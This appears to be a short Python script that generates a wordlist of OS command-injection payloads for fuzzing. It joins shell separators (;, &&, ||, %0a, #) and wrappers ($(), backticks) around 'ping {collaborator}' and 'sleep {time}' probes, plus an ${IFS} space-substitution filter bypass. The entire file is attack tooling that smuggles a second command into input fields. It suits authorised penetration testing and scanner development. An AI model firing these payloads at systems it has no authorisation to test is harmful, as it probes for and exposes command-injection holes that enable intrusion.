prefixes = ['',';','&','&&','|','||','%0a']

suffixes = ['',';','&','&&','|','||','#',';#']

encapsulations = [
    '{payload}',
    '${{payload}}',
    '`{payload}`',
]

payloads = [
    'ping {collaborator}',
    'sleep {time}',
]

bypasses = {
    ' ': '${IFS}'
}

def generate():
    wordlist = []

    for prefix in prefixes:
        for suffix in suffixes:
            for encapsulation in encapsulations:
                for payload in payloads:
                    word = prefix + encapsulation + suffix
                    word = word.replace('{payload}', payload)
                    wordlist.append(word)
                    for key, value in bypasses.items():
                        wordlist.append(word.replace(key, value))

    return wordlist
